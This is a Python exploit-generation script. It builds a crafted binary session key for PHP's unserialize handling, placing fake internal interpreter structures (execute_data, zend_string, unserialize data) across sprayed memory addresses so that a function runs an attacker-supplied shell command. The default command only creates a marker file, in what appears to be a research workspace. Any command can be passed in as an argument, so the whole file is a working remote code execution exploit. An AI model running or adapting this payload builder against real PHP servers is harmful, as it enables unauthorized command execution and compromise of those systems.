#!/usr/bin/env python3
import struct,sys,json
TARGET=0x22c54c8
X1=int(sys.argv[1],0)
KEYLEN=int(sys.argv[2])
PLO=int(sys.argv[3],0); PHI=int(sys.argv[4],0)
F=int(sys.argv[5],0)
OUT=sys.argv[6]
CMD=sys.argv[7].encode() if len(sys.argv)>7 else b'touch /tmp/opencode/research/uploadprog_20261022T014518Z/MARK_UP;'
key=bytearray(b'A'*KEYLEN)
# fake execute_data at record start, key offset = file offset - 39
def put(off,data):
    key[off:off+len(data)]=data
put(0x2c-39,struct.pack('<I',1))          # num_args
put(0x50-39,struct.pack('<Q',F))          # arg value
put(0x58-39,struct.pack('<I',6))          # arg type IS_STRING
# fake zend_string at record 0x200 => key 0x1d9
F_OFF=0x200
ko=F_OFF-39
put(ko, b'\x00'*0x18)
put(ko+0x10,struct.pack('<Q',len(CMD)))
put(ko+0x18,CMD)
put(ko+0x18+len(CMD),b'\x00')
# spray fake php_unserialize_data for page-aligned P candidates
variants=0; skipped=[]; skippipe=[]
for P in range(PLO,PHI+1,0x1000):
    fo=P-X1-24
    k=fo-39
    if k<0 or k+0x98>KEYLEN:
        skipped.append(hex(P)); continue
    vals=((0,P+0x38),(8,P+0x88),(16,P+0x88),(24,0),(32,0),(40,0),(48,0x7fffffff),(56,0),(64,0))
    used=(TARGET-(P+0x88+0x10))//16
    blob=bytearray(0x98)
    for off,q in vals:
        blob[off:off+8]=struct.pack('<Q',q&0xffffffffffffffff)
    blob[0x88:0x90]=struct.pack('<q',used)
    blob[0x90:0x98]=struct.pack('<Q',0)
    if b'|' in blob:
        skippipe.append(hex(P)); continue
    key[k:k+0x98]=blob
    variants+=1
if b'|' in key:
    i=key.index(b'|'); raise SystemExit('pipe in key at %#x'%i)
open(OUT,'wb').write(bytes(key))
meta=dict(X1=hex(X1),KEYLEN=KEYLEN,PLO=hex(PLO),PHI=hex(PHI),F=hex(F),CMD=CMD.decode(),
          variants=variants,skipped=skipped[:10],n_skipped=len(skipped),skippipe=skippipe,pipe=False,
          frame=dict(num_args_off=0x2c-39,arg_off=0x50-39,type_off=0x58-39,
                     zstr_off=F_OFF-39,zstr_len_off=F_OFF-39+0x10,zstr_cmd_off=F_OFF-39+0x18))
json.dump(meta,open(OUT+'.json','w'),indent=1)
print(json.dumps(meta,indent=1))
